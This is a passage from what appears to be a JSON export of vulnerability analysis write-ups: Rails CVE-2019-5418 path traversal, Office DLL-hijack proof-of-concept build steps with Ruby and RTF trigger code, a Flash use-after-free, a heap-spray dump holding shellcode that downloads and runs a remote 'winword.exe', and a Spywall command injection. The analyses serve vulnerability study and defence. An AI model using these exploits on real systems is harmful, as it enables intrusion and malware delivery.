\"/etc/passwd{{},}{+{},}{.{raw,erb,html,builder,ruby,coffee,jbuilder},}\"\n[8] pry(#<ActionView::FallbackFileSystemResolver>)> find_template_paths(path)\n=> [\"/etc/passwd\"]\n```\n\nAfter that point, the path will be used to create a Template object, and the application ends up loading something that it's not supposed to load. That is our directory traversal bug.\n\n## Patching\n\nThe way CVE-2019-5418 is patched is quite simple. Instead of allowing any formats, Rails now only allows the registered MIME types, which makes sense because \"registered\" implies trusted:\n\n```ruby\nv = v.select do |format|\n  format.symbol || format.ref == \"*/*\"\nend\n```\n\nHowever, I can't help but feel the way the `build_query` method is written, and how it is used, is prone to problems. `gsub` is probably too much freedom on a string, especially that string is used as a file path.\n\n",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "239780a0-97fc-4adb-8bdf-6a3a5e5a73e3",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "99f5741d-b774-4d4c-9de3-153086500b61",
      "created": "2019-09-12T18:07:32.910072Z",
      "revisionDate": "2020-10-19T22:30:43.859818Z",
      "document": "\n\n## Details\n\nInstall\n\nMySQL-client-community-5.1.66-1.rhel4.i386.rpm  MySQL-shared-community-5.1.66-1.rhel4.i386.rpm\nMySQL-server-community-5.1.66-1.rhel4.i386.rpm\n\nPackages available here: http://downloads.skysql.com/archive/index/p/mysql/v/5.1.66\n\nOn a fresh CentOS install (minimal) mysql-libs are installed, it and its dependencies should be deleted with rpm -e (all at the same time).\n\n\nOnce installed add a user:\n\n```\nmysql> CREATE USER 'juan'@'%' IDENTIFIED BY 'mypass';\nQuery OK, 0 rows affected (0.00 sec)\n```\n\nAnd grant privileges:\n\n```\nmysql> GRANT ALL PRIVILEGES ON *.* TO 'juan'@'%';\nQuery OK, 0 rows affected (0.00 sec)\n```\n\n```\nmysql> FLUSH PRIVILEGES;\nQuery OK, 0 rows affected (0.00 sec)\n```\n\nReady to test...\n\nStart through mysqld_safe:\n\n```\n[root@localhost mysql]# /usr/bin/mysqld_safe --user=mysql\n130712 07:23:38 mysqld_safe Logging to '/var/lib/mysql/localhost.localdomain.err'.\n130712 07:23:38 mysqld_safe Starting mysqld daemon with databases from /var/lib/mysql\n```\n",
      "score": 2,
      "metadata": {},
      "tags": []
    },
    {
      "id": "091c023c-bb06-44fe-b22e-4dd4c9545a5f",
      "editorId": "d88538cf-ab2c-464f-bb08-607db9cef99f",
      "topicId": "7386cfe2-88af-4e79-9d39-ed7781c607c8",
      "created": "2019-09-12T18:07:34.47609Z",
      "revisionDate": "2020-02-13T17:12:13.773403Z",
      "document": "\n\n## Details\n\nThis vulnerability was originally reported on Project Zero. A PoC is available from the website.\nTo analyze this PoC (on Windows), first let's set up our breakpoints (save the following as bp.txt):\n\n```\nbu kernel32!LoadLibraryW \".printf \\\"kernel32!LoadLibraryW loading %mu\\n\\n\\\", poi(esp+4); .echo; g\"\nbu kernel32!LoadLibraryA \".printf \\\"Kernel32!LoadLibraryA loading %ma\\n\\n\\\", poi(esp+4); .echo; g\"\nbu kernel32!LoadLibraryExW \"r $t0=poi(esp+4); .printf \\\"Kernel32!LoadLibraryExW loading %mu\\n\\n\\\", @$t0; .echo; g\"\nsxe ld elsext.dll\n```\n\nAlso, save the following script as run_windbg.bat (change the bp.txt path if needed):\n\n```\ncd \"C:\\Program Files\\Debugging Tools for Windows (x86)\"\nwindbg.exe -c \"$$><C:\\dev\\bp.txt; g\" \"C:\\Program Files\\Microsoft Office\\Office15\\WINWORD.exe\"\n```\n\nThis allows us to debug more quickly with WinDBG.\n\nDouble-click on run_windbg.bat, it should start MSFT Office Word, and automatically attach WinDBG.\n\nIn office, open the PoC document, and then either one-click, or double click on the text file icon.\nWinDBG should trigger a module-on-load breakpoint for elsext.dll, and you should have a callstack\nthat looks similar to:\n\n```\nModLoad: 741e0000 741e6000   C:\\Users\\sinn3r\\Desktop\\elsext.dll\neax=00578b10 ebx=00000000 ecx=00000000 edx=006a26b8 esi=7ffde000 edi=005788f4\neip=77a470b4 esp=0057880c ebp=00578860 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200246\nntdll!KiFastSystemCallRet:\n77a470b4 c3              ret\n0:000> k\nChildEBP RetAddr\n00578808 77a45c34 ntdll!KiFastSystemCallRet\n0057880c 77a6067d ntdll!ZwMapViewOfSection+0xc\n00578860 77a6075a ntdll!LdrpMapViewOfSection+0xc7\n005788f8 77a5fbc1 ntdll!LdrpFindOrMapDll+0x303\n00578a78 77a6232c ntdll!LdrpLoadDll+0x2b2\n00578aac 75e188ee ntdll!LdrLoadDll+0x92\n00578ae4 770d3c12 KERNELBASE!LoadLibraryExW+0x15a\n00578af8 70263162 kernel32!LoadLibraryW+0x11\n00578b34 70263383 els!IsolationAwareLoadLibraryW+0x35\n00578b3c 702636f4 els!InitExtension+0xa\n00578f8c 702533d1 els!InitGlobals+0x301\n00578f90 70254377 els!CDll::AddRef+0xe\n00578f98 70266ce1 els!CComponentDataCF::CComponentDataCF+0x10\n00578fac 778eaec6 els!DllGetClassObject+0x77\n00578fc8 778c91ed ole32!CClassCache::CDllPathEntry::DllGetClassObject+0x30 [d:\\w7rtm\\com\\ole32\\com\\objact\\dllcache.cxx @ 3324]\n00578fe0 778c8eb2 ole32!CClassCache::CDllFnPtrMoniker::BindToObjectNoSwitch+0x1f [d:\\w7rtm\\com\\ole32\\com\\objact\\dllcache.cxx @ 3831]\n00579018 778c8c57 ole32!CClassCache::GetClassObject+0x49 [d:\\w7rtm\\com\\ole32\\com\\objact\\dllcache.cxx @ 4582]\n00579094 778e3170 ole32!CServerContextActivator::CreateInstance+0x110 [d:\\w7rtm\\com\\ole32\\com\\objact\\actvator.cxx @ 974]\n005790d4 778c8dca ole32!ActivationPropertiesIn::DelegateCreateInstance+0x108 [d:\\w7rtm\\com\\ole32\\actprops\\actprops.cxx @ 1917]\n00579128 778c8d3f ole32!CApartmentActivator::CreateInstance+0x112 [d:\\w7rtm\\com\\ole32\\com\\objact\\actvator.cxx @ 2268]\n```\n\nThis call stack confirms the unsafe DLL loading. It's almost the same as the one shown on Project\nZero, but PZ probably put a breakpoint on LoadLibrary and dumped the callstack that way, therefore\na little more info.\n\nTo create the PoC from scratch, here's how:\n\n1. Prepare a elsext.dll. You can download this from Project Zero, or you should be able to run your\n   own DLL.\n2. Create a new document with Microsoft Office Word. Click on Insert -> Object -> Create from File ->\n   select a text file (any text file should be fine), click on OK. And then save this document as\n   docx.\n3. Decompress the docx file. You can do this with 7zip.\n4. In the decompressed folder, go to word -> embeddings, you should see an oleObject1.bin file.\n5. Use lib/rex/ole/samples/ole_info.rb to inspect this oleObject1.bin file. Confirm that in the\n   first directory entry, the CLSID is 0003000c-0000-0000-c000-000000000046 (the CLSID\n   for embedded Packager; for system32\\packager.dll). This is also the only dir entry with a\n   CLSID.\n6. Open a hex editor (such as 010 Editor), and modify the CLSID to 394c052e-b830-11d0-9a86-00c04fd8dbf7.\n   The exact byte order is: ```2E 05 4C 39 30 B8 D0 11 9A 86 00 C0 4F D8 DB F7```\n7. Save the modified oleObject1.bin file.\n8. Replace the original oleObject1.bin with the modified one.\n9. Package the docx again. This is done by selecting _rels, docProps, word, and [Content_Types].xml,\n   right click, go to 7zip, and then click on \"Add to something.zip\".\n10. You should now have a new zip file. Rename this to docx.\n11. Make sure this is a valid docx file by opening it. MSFT Office Word should be able to open it\n    without an error.\n\nWhile attempting to build the PoC from scratch, I also tried to build the oleObject1.bin file\nusing the MSF OLE API:\n\n```ruby\n# -*- coding: binary -*-\n\nmsfbase = __FILE__\nwhile File.symlink?(msfbase)\n  msfbase = File.expand_path(File.readlink(msfbase), File.dirname(msfbase))\nend\n\n$:.unshift(File.expand_path(File.join(File.dirname(msfbase), '..', '..', 'lib')))\nrequire 'msfenv'\nrequire 'rex'\nrequire 'rex/ole'\n\ndef create_ole\n  ole_tmp = Rex::Quickfile.new('ole')\n  stg = Rex::OLE::Storage.new(ole_tmp.path, Rex::OLE::STGM_WRITE)\n\n  data = \"\\x01\\x00\\xfe\\xff\\x03\\x0a\\x00\\x00\\xff\\xff\\xff\\xff\\x0c\\x00\\x03\\x00\"\n  data << \"\\x00\\x00\\x00\\x00\\xc0\\x00\\x00\\x00\\x00\\x00\\x00\\x46\\x0c\\x00\\x00\\x00\"\n  data << \"\\x4f\\x4c\\x45\\x20\\x50\\x61\\x63\\x6b\\x61\\x67\\x65\\x00\\x00\\x00\\x00\\x00\"\n  data << \"\\x08\\x00\\x00\\x00\\x50\\x61\\x63\\x6b\\x61\\x67\\x65\\x00\\xf4\\x39\\xb2\\x71\"\n  data << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n  data << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n  data << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n  data << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n  data << \"\\x00\\x00\\x03\\x00\\x0d\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n  data << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n  data << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n  data << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n  data << \"\\x1a\\x01\\x00\\x00\\x02\\x00\\x74\\x65\\x73\\x74\\x2e\\x74\\x78\\x74\\x00\\x43\"\n  data << \"\\x3a\\x5c\\x55\\x73\\x65\\x72\\x73\\x5c\\x73\\x69\\x6e\\x6e\\x33\\x72\\x5c\\x44\"\n  data << \"\\x65\\x73\\x6b\\x74\\x6f\\x70\\x5c\\x74\\x65\\x73\\x74\\x2e\\x74\\x78\\x74\\x00\"\n  data << \"\\x00\\x00\\x03\\x00\\x2c\\x00\\x00\\x00\\x43\\x3a\\x5c\\x55\\x73\\x65\\x72\\x73\"\n  data << \"\\x5c\\x73\\x69\\x6e\\x6e\\x33\\x72\\x5c\\x41\\x70\\x70\\x44\\x61\\x74\\x61\\x5c\"\n  data << \"\\x4c\\x6f\\x63\\x61\\x6c\\x5c\\x54\\x65\\x6d\\x70\\x5c\\x74\\x65\\x73\\x74\\x2e\"\n  data << \"\\x74\\x78\\x74\\x00\\x04\\x00\\x00\\x00\\x74\\x65\\x73\\x74\\x2b\\x00\\x00\\x00\"\n  data << \"\\x43\\x00\\x3a\\x00\\x5c\\x00\\x55\\x00\\x73\\x00\\x65\\x00\\x72\\x00\\x73\\x00\"\n  data << \"\\x5c\\x00\\x73\\x00\\x69\\x00\\x6e\\x00\\x6e\\x00\\x33\\x00\\x72\\x00\\x5c\\x00\"\n  data << \"\\x41\\x00\\x70\\x00\\x70\\x00\\x44\\x00\\x61\\x00\\x74\\x00\\x61\\x00\\x5c\\x00\"\n  data << \"\\x4c\\x00\\x6f\\x00\\x63\\x00\\x61\\x00\\x6c\\x00\\x5c\\x00\\x54\\x00\\x65\\x00\"\n  data << \"\\x6d\\x00\\x70\\x00\\x5c\\x00\\x74\\x00\\x65\\x00\\x73\\x00\\x74\\x00\\x2e\\x00\"\n  data << \"\\x74\\x00\\x78\\x00\\x74\\x00\\x08\\x00\\x00\\x00\\x74\\x00\\x65\\x00\\x73\\x00\"\n  data << \"\\x74\\x00\\x2e\\x00\\x74\\x00\\x78\\x00\\x74\\x00\\x20\\x00\\x00\\x00\\x43\\x00\"\n  data << \"\\x3a\\x00\\x5c\\x00\\x55\\x00\\x73\\x00\\x65\\x00\\x72\\x00\\x73\\x00\\x5c\\x00\"\n  data << \"\\x73\\x00\\x69\\x00\\x6e\\x00\\x6e\\x00\\x33\\x00\\x72\\x00\\x5c\\x00\\x44\\x00\"\n  data << \"\\x65\\x00\\x73\\x00\\x6b\\x00\\x74\\x00\\x6f\\x00\\x70\\x00\\x5c\\x00\\x74\\x00\"\n  data << \"\\x65\\x00\\x73\\x00\\x74\\x00\\x2e\\x00\\x74\\x00\\x78\\x00\\x74\\x00\\x00\\x00\"\n\n  directory = stg.instance_variable_get(:@directory)\n  directory.each_entry do |entry|\n    if entry.instance_variable_get(:@_ab) == 'Root Entry'\n      # els\n      # 394c052e-b830-11d0-9a86-00c04fd8dbf7\n       clsid = Rex::OLE::CLSID.new(\"\\x2e\\x05\\x4c\\x39\\x30\\xb8\\xd0\\x11\\x9a\\x86\\x00\\xc0\\x4f\\xd8\\xdb\\xf7\")\n      entry.instance_variable_set(:@_clsId, clsid)\n\n      stream = Rex::OLE::Stream.new(entry)\n      stream << data\n      stream.close\n      stg.write_mini_stream(stream)\n    end\n  end\n\n  stm = stg.create_stream(\"EPRINT\")\n  stm.close\n\n  stm = stg.create_stream(\"CompObj\")\n  stm.close\n\n  stm = stg.create_stream(\"ObjInfo\")\n  stm.close\n\n  stm = stg.create_stream(\"Ole10Native\")\n  stm.close\n\n  # write to disk\n  stg.close\n\n  ole_contents = File.read(ole_tmp.path)\n  ole_tmp.close\n  ole_tmp.unlink\n\n  ole_contents\nend\n\n\nf = File.open('/tmp/ole.bin', 'wb')\nf.write(create_ole)\nf.close\n\nputs \"OlE created\"\n```\n\nHowever, I never had much luck. Even though I don't have a corrupt docx (at least no complaints\nfrom MSFT), elsext.dll wouldn't load. Currently unsure why.\n\nBTW, lib/rex/ole/samples/ole_info.rb doesn't seem to be a good tool for inspecting an OLE object\nfile. A better tool seems to be [oletools](http://www.decalage.info/python/oletools).\n\nAnother way to load the DLL is having the following as a RTF document. This should trigger the load\nas soon as the document is opened:\n\n```\n{\\rtf1{\\object\\objemb{\\*\\objclass None}{\\*\\oleclsid \\'7b394c052e-b830-11d0-9a86-00c04fd8dbf7\\'7d}{\\*\\objdata 010500000100000001000000000000000000000000000000000000000000000000000000000000000000000000}}}\n```\n\nThe above RTF can also be embedded in a docx as an object, but requires extra user interaction\n(double-click) to trigger the DLL.\n",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "07ca799e-5951-4426-b75e-1c5b48ee4a81",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "bdc2bc7e-5904-4c44-80ed-e26e3bd1a1a6",
      "created": "2019-09-12T18:07:35.086266Z",
      "revisionDate": "2020-02-13T17:12:13.532963Z",
      "document": "\r\n\r\nhttp://en.wikipedia.org/wiki/Adobe_Flash_Player\r\n\r\nCongrats! You are reading about the most beautiful Flash bug for the last four\r\nyears since CVE-2010-2161.\r\n\r\nThe use-after-free vulnerability exists inside the built-in ByteArray class\r\nhttp://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/utils/ByteArray.html\r\n\r\nLet's create a simple ByteArray object:\r\n\r\n```\r\nvar ba:ByteArray = new ByteArray();\r\nba.length = 8;\r\nba[1] = 1;\r\n```\r\n\r\nNow we can access ba[] items and write numeric byte values into ba[].\r\nAlso we are allowed to write objects into ByteArray. For example:\r\n\r\n```\r\nvar obj = new MyClass();\r\nba[0] = obj;\r\n```\r\n\r\nAS3 will try to implicitly convert the MyClass object into numeric value by\r\ncalling the MyClass.valueOf() method. This method can be easily redefined\r\nwithin the user's code:\r\n\r\n```\r\nclass MyClass\r\n{\r\n    prototype.valueOf = function()\r\n    {\r\n        ba.length = 88; // reallocate ba[] storage\r\n        return 0;       // return byte for ba[offset]\r\n    }\r\n}\r\n```\r\n\r\nLet's see how that implicit conversion occurs inside the native code:\r\n\r\n```\r\npush esi\r\nmov  eax, [esp+8]                // the offset value from \"ba[offset] = obj\"\r\npush eax\r\nadd  ecx, 0x18                   // ecx = this = \"ba\" object pointer\r\ncall ByteArray.getStorage()      // gets ba[offset] storage pointer and\r\nmov  esi, eax                    // saves it in esi\r\n\r\nmov  ecx, [esp+0xC]              // \"obj\" pointer\r\npush ecx\r\ncall AvmCore.toInteger()         // call MyClass.valueOf()\r\nadd  esp,4\r\nmov  [esi], al                   // writes returned byte into array\r\n\r\npop  esi\r\nret  8\r\n```\r\n\r\nOn high-level language this will look like:\r\n\r\n```\r\nvoid ByteArray.setObjInternal(int offset, obj)\r\n{\r\n    byte* dest = this.getStorage(offset);\r\n    dest* = toInteger(obj);\r\n}\r\n```\r\n\r\nSo the array storage pointer is saved in local variable, then AS3 valueOf() is\r\ninvoked from the native code and returned byte is written into destination\r\npointer at the end. If valueOf() changes the length of byte array (see above)\r\nand reallocates its internal storage, then local destination pointer becomes\r\nobsolete and further usage of that pointer can lead to UaF memory corruption.\r\n\r\nUsing this vulnerability, it's very easy to control what byte will be written\r\nand at which offset this corruption will occur.\r\n\r\n3. AFFECTED SOFTWARE\r\nAdobe Flash Player 9 and higher\r\n\r\n\r\n4. TESTING\r\nOpen the test \"calc.htm\" file in your browser and press the button.\r\n\r\non Windows:\r\nCalc.exe should be popped on desktop IE.\r\nCalc.exe should be run as a non-GUI child process in metro IE.\r\nPayload returns 0 from CreateProcessA(\"calc.exe\") inside Chrome/FF sandbox.\r\n\r\non OS X:\r\nCalculator is launched in FF or standalone Flash Player projector.\r\nPayload returns 1 from vfork() in Safari sandbox.\r\n\r\n\r\n",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "ef6e31af-7b85-41cd-878a-87756e8258f7",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "29a5ae08-0b9d-4482-a746-3b9f3cc56934",
      "created": "2019-09-12T18:07:35.704681Z",
      "revisionDate": "2020-02-13T17:12:13.326323Z",
      "document": "\n.text:7625B0F2\n.text:7625B0F2 loc_7625B0F2:                           ; CODE XREF: _MemAllocClear(x)+25\u0018j\n.text:7625B0F2                                         ; _MemAllocClear(x)+33\u0018j ...\n.text:7625B0F2                 push    [ebp+dwBytes]   ; dwBytes\n.text:7625B0F5                 push    8               ; dwFlags\n.text:7625B0F7                 push    _g_hProcessHeap ; hHeap\n.text:7625B0FD                 call    ds:__imp__HeapAlloc@12 ; HeapAlloc(x,x,x)\n.text:7625B103\n.text:7625B103 loc_7625B103:                           ; CODE XREF: _MemAllocClear(x)+71\u0018j\n.text:7625B103                 pop     edi\n.text:7625B104                 pop     ebx\n.text:7625B105                 leave\n.text:7625B106                 retn    4\n.text:7625B106 __MemAllocClear@4 endp\n.text:7625B106\n```\n",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "962f0e61-3d92-4ecb-9ea8-8fd6860f9280",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "5ee043d8-3181-4c10-a4aa-082575ef14e2",
      "created": "2019-09-12T18:07:36.986753Z",
      "revisionDate": "2020-02-13T17:12:13.113352Z",
      "document": " See #7\n```\n\nSo what happens is that:\n\n1. The function grabs the value 98 b8 ff ff from the trigger file at offset 00003320h. This DWORD value\n   is translated as 0xffffb898.\n2. The function grabs another byte (44) using movzx\n3. In the loc_44153C77 loop, the function looks for the first byte of every DWORD starting at file offset\n   00003320h+4, until the counter runs out. By the time we're out of the loop, EAX is 0xffffeaec. So this\n   also means that in the file, the chunk starting at 00003320h+4 is part of the algorithm used to calculate\n   the heap size.\n4. The HeapAllc size loaded is done with this: lea eax, [eax+ecx*2+8], where eax at this point is\n   0xffffeaec, ecx is 44. So what it's doing is: 0xffffeaec + 0x44 * 2 + 8, this gets us 0xffffeb7c in EAX\n5. The final calculation of the HeapAlloc size is eax + esi (image length also obtained from the file), so\n   that means 0xffffeb7c + 0x00001484, and on a 32-bit machine this ends up being: 00000000.\n6. HeapAlloc attempts to allocate a buffer with size 0, but it'll throw you a chunk awright.\n7. The same chunk is used for memcpy. This chunk contains a pointer that OGL!GdipCreatePath will use later.\n\nSo since we have control of the source (JFIF data), we can overwrite OGL!GdipCreatePath's pointer,\nand have direct control of the CALL instruction. By using a heap spray, we can set up the memory\nlayout and tell the CALL instruction where to go.\n\n\n# ActiveX heap spray\n\nThe payload is basically a bin file from the ActiveX folder in the docx \"file\", in memory it looks\nlike (see ActiveX1.bin for example):\n\n```\n0:000> dc 1539bde1+3+4 L100\n1539bde8  08080808 08080808 08080808 08080808  ................\n1539bdf8  08080808 08080808 08080808 08080808  ................\n1539be08  08080808 08080808 08080808 08080808  ................\n1539be18  08080808 bcae6aeb 11c82761 0b6c2758  .....j..a'..X'l.\n1539be28  67fe275e c9f22759 0000275c 0c000000  ^'.gY'..\\'......\n1539be38  30000000 00400000 0c000000 ea460000  ...0..@.......F.\n1539be48  0da42759 a0002759 00852762 a010275e  Y'..Y'..b'..^'..\n1539be58  60122762 88792759 cfe7275b 0000275d  b'.`Y'y.['..]'..\n1539be68  00240000 00000000 60120000 01b82759  ..$........`Y'..\n1539be78  0000275e 92a20000 92672759 90902758  ^'......Y'g.X'..\n1539be88  7feb9090 41414141 41414141 41414141  ....AAAAAAAAAAAA\n1539be98  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA\n1539bea8  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA\n1539beb8  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA\n1539bec8  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA\n1539bed8  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA\n1539bee8  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA\n1539bef8  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA\n1539bf08  90909024 ffffe890 5ac0ffff 505379eb  $..........Z.ySP\n1539bf18  56f38957 8b3c738b 01781e74 768b56de  W..V.s<.t.x..V.v\n1539bf28  31de0120 ad4149c9 3156d801 10be0ff6   ..1.IA...V1....\n1539bf38  0874d638 0107cec1 f1eb40d6 755e3739  8.t......@..97^u\n1539bf48  dd895ae5 01245a8b 0c8b66eb 1c5a8b4b  .Z...Z$..f..K.Z.\n1539bf58  048beb01 abe8018b c7835f5e c35b5804  ........^_...X[.\n1539bf68  74e83880 e938800f 38800a74 800574cc  .8.t..8.t..8.t..\n1539bf78  1175eb38 90057881 74909090 55ff8908  8.u..x.....t...U\n1539bf88  408de589 31e0ff05 408b64c0 0c408b30  ...@...1.d.@0.@.\n1539bf98  8b1c408b 788b0870 66008b20 00187f83  .@..p..x ..f....\n1539bfa8  ec81f175 00000000 07c7e789 0c917432  u...........2t..\n1539bfb8  390447c7 c7837de2 89630847 47c74fd1  .G.9.}..G.c..O.G\n1539bfc8  afd6800c 1047c79a 213bcb58 8958036a  ......G.X.;!j.X.\n1539bfd8  505789fb ffff35e8 f87548ff 6c68df89  ..WP.5...Hu...hl\n1539bfe8  6800006c 642e6e6f 6c727568 078b546d  l..hon.dhurlmT..\n1539bff8  ffff6be8 83c689ff 0fe80cc7 89ffffff  .k..............\n1539c008  6c6468df 6c68006c 682e3233 6c656873  .hdll.hl32.hshel\n1539c018  e8078b54 ffffff48 c783c689 feece810  T...H...........\n1539c028  df89ffff 0550478b 0000019e 89fbc083  .....GP.........\n1539c038  c6895847 3846c931 4efb750e 752f3e80  GX..1.F8.u.N.>/u\n1539c048  778946fa 50778b5c 01bfc681 c6830000  .F.w\\.wP........\n1539c058  60778920 00806856 478b0000 fefee804   .w`Vh.....G....\n1539c068  8d57ffff 778b061c a4df895c 00ff7f80  ..W....w\\.......\n1539c078  315ff975 ff5151c9 77ff6077 478b5158  u._1.QQ.w`.wXQ.G\n1539c088  fedae80c c931ffff ff515151 51516077  ......1.QQQ.w`QQ\n1539c098  e810478b fffffec8 8b50c031 bde80847  .G......1.P.G...\n1539c0a8  68fffffe 3a707474 796d2f2f 74616c66  ...http://myflat\n1539c0b8  2e74656e 2f6d6f63 63757262 2f335f65  net.com/bruce_3/\n1539c0c8  776e6977 2e64726f 00657865 cccccccc  winword.exe.....\n```\n\nThe ActiveX control used for the spray:\n\n```\nPossible spray:\nHKEY_CLASSES_ROOT\\CLSID\\{1EFB6596-857C-11D1-B16A-00C0F0283628}\nMicrosoft TabStrip Control, version 6.0\nC:\\WINDOWS\\system32\\MSCOMCTL.OCX\nProgID: MSComctlLib.TabStrip.2\nVersionIndependentprogID: MSComctlLib.TabStrip\n\n0:000> r\neax=00001000 ebx=06ac3f90 ecx=000001d4 edx=04f7b600 esi=0012026c edi=1539beb0\neip=77535f87 esp=0011f658 ebp=0011f698 iopl=0         nv up ei pl nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206\nole32!CoGetStandardMarshal+0x17b3:\n77535f87 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]\n\nChildEBP RetAddr\nWARNING: Stack unwind information not available. Following frames may be wrong.\n0011f698 77535f10 ole32!CoGetStandardMarshal+0x17b3\n0011f6bc 77536f9a ole32!CoGetStandardMarshal+0x173c\n0011f8b8 77536db7 ole32!CoGetStandardMarshal+0x27c6\n0011f8f0 77536a40 ole32!CoGetStandardMarshal+0x25e3\n0011f90c 77536c33 ole32!CoGetStandardMarshal+0x226c\n0011f930 77536b2f ole32!CoGetStandardMarshal+0x245f\n0011f980 39c98198 ole32!CoGetStandardMarshal+0x235b\n001209c0 39c9959e mso!Ordinal4410+0x336\n001209e0 77543ba1 mso!Ordinal4410+0x173c\n00120a10 31dc38ed ole32!OleSave+0x52\n00120a60 31dc35ab wwlib!DllGetLCID+0x4e7877\n00120aa4 321bbb25 wwlib!DllGetLCID+0x4e7535\n00120b8c 321bc223 wwlib!wdGetApplicationObject+0x4c587\n00120ba0 321bc330 wwlib!wdGetApplicationObject+0x4cc85\n00120de8 0fa09d3a wwlib!wdGetApplicationObject+0x4cd92\n00120e28 0f9e3fbf VBE7!rtcStrConvVar+0x960a\n00120e5c 0f9e53ac VBE7!rtUI1FromErrVar+0x4515\n00120eec 321bcf43 VBE7!rtUI1FromErrVar+0x5902\n00120fb0 321bd18e wwlib!wdGetApplicationObject+0x4d9a5\n00120fd8 31be95dc wwlib!wdGetApplicationObject+0x4dbf0\n```\n\n",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "3e75d6bd-12ed-4c82-8e50-04f70c491122",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "b3b3da42-859e-48bf-b67e-3a4e5f266e97",
      "created": "2019-09-12T18:07:37.635018Z",
      "revisionDate": "2020-10-21T20:10:56.294577Z",
      "document": "--\\\" >> logging\");\nexec(\"echo \\\"route >> logging\\\" >> networkScript\");\necho \"executing script<br/>\";\nexec(\"./networkScript\");\n?>\n</body>\n</html>\n```\n\nAnalysis of the command injection\n\n```\necho \"ifconfig eth0 netmask \". $HTTP_POST_VARS[\"subnet\"] .\" \". $HTTP_POST_VARS[\"ip\"] .\";\" >> networkScript\n```\n\n```\n\u201c;\" + payload.encoded + \";#\u201d\n```\n\n**/spywall/network.php**\n\n```php\n<?php\n\nrequire_once('includes/spywall_api.php');\n/*\n$wan = 'eth0';\n$lan = 'eth1';\n$management = 'eth2';\n$mon = 'eth3';\n$savename = '';\n\n$model = exec('cat /tmp/appliancemodel');\nif ($model == '007' || $model == '009') {\n\t// different ethernet device numbers for these models\n\t$management = 'eth0';\n\t$mon = 'eth3';\n\t$wan = 'eth5';\n\t$lan = 'eth6';\n}\n*/\n$portMap = getPortMap();\n$management = $portMap['mgmt'];\n$mon = $portMap['monitor'];\n$wan = $portMap['wan'];\n$lan = $portMap['lan'];\n\n$device = '';\nif ($_POST['name'] == 'lan') {\n\t$device = $lan;\n\t$savename = 'LAN';\n} else if ($_POST['name'] == 'wan') {\n\t$device = $wan;\n\t$savename = 'WAN';\n} else if ($_POST['name'] == 'monitor') {\n\t$device = $mon;\n\t$savename = 'MON';\n} else {\n\t$device = $management;\n\t$savename = 'MAN';\n}\n\nif (strlen($device)) {\n\t// set autonegotiation, duplex (if it isn't set to unknown),\n\t// and speed (if it isn't set to unknown)\n\texec(\"sudo /sbin/ethtool -s $device autoneg \". $_POST['auto'] .((isset($_POST['duplex']) && $_POST['duplex'] != 'unknown')?(\" duplex \". $_POST['duplex']):'') .((isset($_POST['speed']) && $_POST['speed'] != 'unknown')?(\" speed \". $_POST['speed']):''));\n\n        exec(\"sudo /bin/rm -f /home/admin/autoconfig\". $savename);\n\t// save info to autoconfig file\n\texec(\"echo \\\"/sbin/ethtool -s $device autoneg \". $_POST['auto'] .((isset($_POST['duplex']) && $_POST['duplex'] != 'unknown')?(\" duplex \". $_POST['duplex']):'') .((isset($_POST['speed']) && $_POST['speed'] != 'unknown')?(\" speed \". $_POST['speed']):'') .\"\\\" > /home/admin/autoconfig\". $savename);\n//\techo \"\\\"/sbin/ethtool -s $device autoneg \". $_POST['auto'] .(($_POST['duplex'] != 'unknown')?(\" duplex \". $_POST['duplex']):'') .(($_POST['speed'] != 'unknown')?(\" speed \". $_POST['speed']):'') .\"\\\" > /home/admin/autoconfig\". $savename;\n\tsleep(5);\t// we sleep because otherwise we get back before the changes take effect\n}\n\n?>\n<script language=\"javascript\"> window.location=\"admin_advanced.php\";</script>\n```\n",
      "score": 2,
      "metadata": {},
      "tags": []
    },
    {
      "id": "28caa35c-7c72-4dd7-92fc-00149d56422a",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "4e29add3-1974-4e00-9ced-fc5da3e7c923",
      "created": "2019-09-12T18:07:39.607129Z",
      "revisionDate": "2020-02-13T17:12:12.658057Z",
